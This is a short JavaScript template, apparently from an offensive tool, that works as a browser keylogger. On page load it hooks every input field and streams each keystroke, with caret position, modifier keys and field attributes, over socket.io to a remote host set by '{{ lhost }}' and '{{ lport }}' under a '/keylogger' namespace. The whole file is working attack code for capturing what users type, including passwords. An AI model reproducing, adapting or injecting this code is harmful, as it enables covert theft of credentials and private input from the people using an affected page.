function logKeystroke(event) {
    
	var c = event.keyCode || event.keyCode;
        
	socket.emit('keydown', {
		'ks' : c,
		'start_pos' : this.selectionStart,
		'end_pos' : this.selectionEnd,
		'shift' : event.shiftKey,
		'alt' : event.altKey,
		'ctrl' : event.ctrlKey,
		'name' : this.getAttribute('name'),
		'type' : this.getAttribute('type'),
		'id' : this.getAttribute('id'),
		'class' : this.getAttribute('class'),
	});
}
window.onload = function() {

	all_inputs = document.getElementsByTagName('input');
	
	for (var i = 0, length = all_inputs.length; i < length; i++) {
	
		element = all_inputs[i];
		element.addEventListener("keydown", logKeystroke);
	}
	
	namespace = '/keylogger';
	socket = io.connect('http://' + '{{ lhost }}' + ':' + '{{ lport }}' + namespace);
	
}
